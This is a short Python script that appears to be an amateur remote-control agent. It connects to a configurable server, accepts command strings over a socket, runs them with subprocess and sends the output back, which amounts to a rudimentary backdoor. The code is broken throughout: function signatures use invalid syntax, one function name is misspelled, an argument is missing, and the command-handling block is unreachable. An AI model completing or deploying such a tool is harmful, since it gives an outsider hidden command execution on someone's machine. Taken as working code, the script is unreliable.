import sys
import subprocess
import socket
import threading

def execute_funtion(command: str): -> str 
	full_command: list = command.split("-")
	output: str = subprocess.run(full_command, capture_output=True)
	return output 

def send_answer(answer_connection: socket.socket, answer: str): -> bool
	try:
		data_size: int = sys.getsizeof(answer.encode())
		data_size: str = str(data_size)
		answer_connection.send(data_size.encode())
		answer_connection.send(answer.encode())
		return True 

	except:
		return False

def manage_connexions(connection: socket.socket, answer_connection: socket.socket): -> bool 
	while True:
		try:
			(answer_socket, address) = connection.accept()
			data_size = answer_socket.recv(10).decode()
			data = answer_socket.recv(data_size).decode()

		except:
			return False
	try:		
		function_output = execute_function(data)
		success = send_answer(answer_connection)
	except:
		return False

	return success 


def main()
	server_ip: str = ""
	server_port: int = int()

	try:
		sending_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sending_socket.connect((server_ip, server_port))

		reception_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		reception_socket.bind((socket.gethostname(), server_port + 1))

		while True:
			reception_socket.listen(1)
			manage_connexions(reception_socket, sending_socket)

	except:
		main()
